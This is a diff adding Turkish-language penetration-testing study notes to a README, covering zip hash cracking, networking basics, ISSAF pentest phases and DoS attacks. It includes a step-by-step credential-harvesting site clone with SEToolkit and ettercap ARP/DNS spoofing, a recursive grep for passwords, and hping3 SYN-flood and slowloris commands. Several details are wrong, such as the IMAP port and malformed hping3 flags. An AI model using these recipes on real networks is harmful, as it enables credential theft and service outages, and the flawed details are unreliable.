@@ -119,6 +119,22 @@
     - [Metasploitable Hash Kırma](#Metasploitable-Hash-Kırma)
     - [Windows Hash Kırma](#Windows-Hash-Kırma)
     - [Hatalar](#Hatalar)
+- [24-Zip Şifrelerini Kırma](#24-Zip-Şifrelerini-Kırma)
+  - [John](#John)
+- [25-OSI Modelleri](#25-OSI-Modelleri)
+- [26-IPv4 ve IPv6](#26-IPv4-ve-IPv6)
+- [27-NAT](#27-NAT)
+- [28-TCP ve UDP](#28-TCP-ve-UDP)
+  - [TCP ve UDP Farkları](#TCP-ve-UDP-Farkları)
+  - [Kullanılan Portlar](#Kullanılan-Portlar)
+  - [TCP İletişim Kurma Aşamaları](#TCP-İletişim-Kurma-Aşamaları)
+- [29-Web Sitesi Klonlama](#29-Web-Sitesi-Klonlama)
+- [30-ISSAF Raporlama Adımları](#30-ISSAF-Raporlama-Adımları)
+- [31-DOS ve DDOS](#31-DOS-ve-DDOS)
+  - [Protokoller](#Protokoller)
+  - [Saldırı Türleri](#Saldırı-Türleri)
+    - [Volumetrik Saldırılar](#Volumetrik-Saldırılar)
+    - [Protokol Saldırıları](#Protokol-Saldırıları)
 # 1-VPN DNS MAC 
 
 VPN (Virtual Personal Network)
@@ -1140,3 +1156,162 @@ session -1
 2. ```Not enough allocatable device memory for this attack``` hatası alırsak, RAM'imiz yetersiz demektir 4GB RAM yeterli olacaktır
 3. ```Appraching final keyspace workload adjusted``` hatası alırsak, hash kırılamadı demektir
 
+# 24-Zip Şifrelerini Kırma
+
+### John 
+
+1.``` apt get install john``` john'u yüklüyoruz
+2. Zip'in bulunduğu klasöre gidiyoruz ve ```zip2john mysecretfiles.zip``` zip dosyasının hash'ini verir
+3. ```zip2john mysecretfiles.zip | cut -d ':' -f 2``` diyerek ```:```'ye göre ayırıp 2. kısımını (işimize yarayan kısım) alıyoruz
+4. ```zip2john mysecretfiles.zip | cut -d ':' -f 2 > ziphashes.txt``` hash'i ziphashes.txt dosyasına kaydeder
+5. ```hashcat -m 13600 myzip.txt /usr/share/wordlist/fasttrack.txt``` 
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/000f66c5a107ca48ba223ed0c38bdd49c361bb0b/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-09-01%20at%2013.43.17.jpeg)
+
+# 25-OSI Modelleri
+  
+OSI (Open System Interconnection). OSI toplam 7 katmandan oluşur
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/11181d91a94c0ad017d38ca915297e832e6a5591/Websitesi%20Pentesting/Pict/PreviewImage_OSI-model.jpg)
+
+# 26-IPv4 ve IPv6
+
+* Şu an aktif olarak ```IPv4``` kullanıyoruz fakat çok fazla cihaz olmaya başladığı için ```IPv6```'ya geçiş yapılacak
+* ```IPv4``` kullanarak 2³² değer bulabiliriz
+* ```IPv6``` kullanarak ise 2¹²⁸ değer buluruz
+
+# 27-NAT
+
+|   Class Name  | Network Numbers |  Network Mask |    # of Hosts   |
+| ------------- | --------------- | ------------- | --------------- |
+| Class A  | 10.0.0.0   | 255.0.0.0  | 16777214   |
+| Class B | 172.16.0.0    | 255.255.0.0  | 65534   |
+| Class C | 192.168.0.0    | 255.255.255.0  | 254   |
+| Loopback (local) | 127.0.0.0    | 255.255.255.0  |     |
+
+* ! 255 olan kısımlar değiştirilemez sadece 0 olan kısımlar değişebilir
+
+* ```# of Host``` total olabilecek host sayısı - 2'dir. Çünkü 1 IP modeme ve son IP broadcast'e gider. Öğneğin Class C'de 256 tane host olabilir fakat # of hosts 254 dür. (256-2)
+  
+# 28-TCP ve UDP
+  
+### TCP ve UDP Farkları
+
+* ```TCP``` daha düzgün veri aktarımında kullanılır (Bağlantı açma, web sitesine girme, mail alış-verişi)
+* ```UDP``` daha hızlı veri aktarımında kullanılır (Video yayını)
+
+### Kullanılan Portlar
+
+| **TCP**  | **UDP** |
+| ------------- | ------------- |
+| FTP (21)  | DHCP (67)  |
+| SSH (22) | SVMP (161)  |
+| TELNET (23)  |  |
+| SMTP (25) |  |
+| HTTP (80)  | |
+| HTTPS (443) |   |
+| POP3 (110) |  |
+| IMAP (443) |   |
+
+### TCP İletişim Kurma Aşamaları
+
+![](https://study-ccna.com/wp-content/uploads/2018/09/tcp_three_way_handshake.png)
+
+* ```SYN```: Olayı başlatan, selam veren
+* ```SYN ACK```: Selamı alan
+* ```ACK```: Muhabbete başlayan
+
+
+# 29-Web Sitesi Klonlama
+
+> ### 1.Bazı Ayarları Değiştiriyoruz
+
+1. ```locate etter.conf``` ettercap'in conf dosyalarının yerini görürüz
+2. ```leafpad /etc/ettercap/etter.conf``` ettercap'i açarız (etter.conf konumu değişebilir)
+3. ``` ec_vid=0 ve ec_gid=0``` olarak değiştiriyoruz
+4. ```locate etter.dns``` ettercap'in dns dosyalarının bulunduğu yeri görürüz
+5. ```leafpad /etc/ettercap/etter.dns``` açıyoruz
+6. Klonlamak istediğimiz web sitesine girip IP kısmına ```kendi IP``` adresimizi giriyoruz 
+
+> ### 2.SETOOLKIT Açıyoruz
+
+1. ```Social-Enginnering Attack``` seçiyoruz
+2. ```Website Attack Vectors``` seçiyoruz
+3. ```Credetial Harvester Attack Method``` seçiyoruz
+4. ```Site Cloner``` seçiyoruz
+5. ```Kendi IP```'mizi giriyoruz
+6. Sitenin adını yazıyoruz 
+
+> ### 3.EtterCap'i Açıyoruz
+
+1. ```target 1 ve target 2```'yi ekliyoruz
+2. ```MITM ARP``` seçiyoruz
+3. ```sniff remote.com.```seçiyoruz
+4. ```Pluging``` içinden ```dns_spoof``` aktif ediyoruz
+5. ```Setoolkit``` üzerinden dinliyoruz
+
+# 30- ISSAF Raporlama Adımları
+
+> ### 1. Bilgi Toplama
+ Amaç, hedef sistem hakkında olabildiğince detaylı bilgi toplamaktır. Bu bilgiler firma hakkında olabileceği gibi firma çalışanları hakkında da  olabilir.
+> ### 2. Ağ Haritalaması
+ Amaç hedef sistemin ağ yapısının detaylı belirlenmesidir. Açık sistemler ve üzerindeki açık portlar, servisler ve servislerin hangi yazılımın hangi sürümü olduğu bilgileri, ağ girişlerinde bulunan VPN, Firewall, IPS cihazlarının belirlenmesi, sunucu sistemler çalışan işletim sistemlerinin ve versiyonlarının belirlenmesi ve tüm bu bileşenler belirlendikten sonra hedef sisteme ait ağ haritasının çıkartılması Ağ haritalama adımlarında yapılmaktadır. Ağ haritalama bir aktif bilgi toplama yöntemidir. Ağ haritalama esnasında hedef sistemde IPS, WAF ve benzeri savunma sistemlerinin olup olmadığı da belirlenmeli ve gerçekleştirilecek sızma testleri buna göre güncellenmelidir.
+> ### 3. Zafiyet Analizi
+ Bu sürecin amacı  belirlenen hedef sistemlerdeki açıklıkların ortaya çıkarılmasıdır. Bunun için sunucu servislerdeki bannerler ilk aşamada kullanılabilir. Ek olarak birden fazla zayıflık tarama aracı ile bu sistemler ayrı ayrı taranarak oluşabilecek false positive oranı düşürülmeye çalışılır. Bu aşamada hedef sisteme zarar vermeycek taramalar gerçekleştirilir.
+> ### 4. Sisteme Sızma
+ Belirlenen açıklıklar için POC kodları/araçları belirlenerek denelemeler başlatılır. Açıklık için uygun araç yoksa ve imkan varsa ve test için yeteri kadar zaman verilmişse sıfırdan yazılır. Genellikle bu tip araçların yazımı için Python, Ruby gibi betik dilleri tercih edilir. Bu adımda dikkat edilmesi gereken en önemli husus çalıştırılacak exploitlerden önce mutlaka yazılı onay alınması ve mümkünse lab ortamlarında önceden denenmesidir.
+> ### 5. Yetkilendirme
+ Sızma sürecinde amaç sisteme bir şekilde giriş hakkı elde etmektir. Bu süreçten sonra sistemdeki kullanıcının haklarının arttırılması hedeflenmelidir. Linux sistemlerde çekirdek (kernel) versiyonunun incelenerek priv. escelation zafiyetlerinin belirlenmesi ve varsa kullanılarak root haklarına erişilmesi en klasik hak yükseltme adımlarından biridir. Sistemdeki kullanıcıların ve haklarının belirlenmesi, parolasız kullanıcı hesaplarının belirlenmesi, parolaya sahip hesapların uygun araçlarla parolalarının bulunması bu adımın önemli bileşenlerindendir. Hak Yükseltme adımında amaç edinilen herhangi bir sistem hesabı ile tam yetkili bir kullanıcı moduna geçişttir.(root, administrator, system vs)
+> ### 6. Diğer Ağlara Sızma
+ Erişim yapılan sistemlerden şifreli kullanıcı bilgilerinin alınarak daha hızlı bir ortamda denenmesi.  Sızılan  sistemde sniffer çalıştırılabiliyorsa  ana sisteme erişim yapan diğer kullanıcı/sistem bilgilerinin elde edilmesi. Sistemde bulunan çevresel değişkenler ve çeşitli network bilgilerinin kaydedilerek sonraki süreçlerde kullanılmasıdır. Linux sistemlerde en temel örnek olarak grep komutu kullanılabilir. ```grep parola|password|sifre|onemli_kelime -R /```
+> ### 7. Erişimi Sürdürme
+Sisteme girildiğinin başkaları tarafından belirlenmemesi için bazı önlemlerin alınmasında fayda vardır.  Bunlar giriş loglarının silinmesi, çalıştırılan  ek proseslerin saklı olması , dışarıya erişim açılacaksa  gizli kanalların kullanılması(covert channel), backdoor, rootkit yerleştirilmesi vs.
+> ### 8. İzleri Silme
+ Hedef sistemlere bırakılmış arka kapılar, test amaçlı scriptler, sızma testleri için eklenmiş tüm veriler not alınmalı ve test bitiminde silinmelidir
+> ### 9. Raporlama
+Raporlar ne kadar açık ve detaylı/bilgilendirici olursa müşterinin riski değerlendirmesi ve açıklıkları gidermesi  de o kadar kolay olur. Testler esnasında çıkan kritik güvenlik açıklıklarının belgelenerek sözlü olarak anında bildirilmesi test yapan takımın görevlerindendir. Bildirimin ardından açıklığın hızlıca giderilmei için çözüm önerilerinin de birlikte sunulması gerekir. Ayrıca raporların teknik, yönetim ve özet olmak üzere üç  farklı şekilde hazırlanmasında fayda vardır. Teknik raporda hangi uygulama/araçların kullanıldığı, testin yapıldığı tarihler ve çalışma zamanı,  bulunan açıklıkların detayları  ve açıklıkların en hızlı ve kolay yoldan giderilmesini amaçlayan tavsiyeler bulunmalıdır.  
+  
+# 31-DOS ve DDOS
+
+### Protokoller
+
+1. ```IP```: Internet Protocol
+2. ```HTTP```: Hypertext Transfer Protocol
+3. ```TCP```: Transmission Control Protocol
+4. ```UDP```: User Datagram Protocol
+5. ```ICMP```: Internet Control Message Protocol
+
+```Traceroute```-> IP paketinin hedefe ulaşana kadar nerelerden geçtiğini gösterir
+
+### Saldırı Türleri
+
+> ### Volumetrik Saldırılar
+
+```UDP```: Temel portlarına çok sayıda UDP paketi yollanamasıdır
+```ICMP```: **Smurf saldırı** ve **pink flood** saldırılarıdır
+```Reflection Amplification Saldırıları```
+
+! ```ICMP```'den korunmak için **bant genişliği arttırılabilir** veya **paket sayısı ve boyutu kısıtlanabilir**
+
+> ### Protokol Saldırıları
+
+```SYN FLOOD```: En çok kullanılan DDOS saldırı tipidir
+```
+hping3 -c 15000 -d 120 -S -w 64 -o 80 --flood --rand -source 192.168.123.123
+
+* -c: Paket Sayısı
+* -d: Data Büyüklüğü
+* -S: SYN
+* -w: Windows bit boyutu
+* -p: Destport
+* -source: IP Adresi
+```
+
+```HTTP FLOOD``` 
+```SLOWLORIS```
+``` 
+git clone https://githubcom/gkbrk/slowloris.git
+servise apache 2 start
+cd slowloris
+python3 slowloris 192.168.123.123 -s 500 (-s paket sayısı)
+```
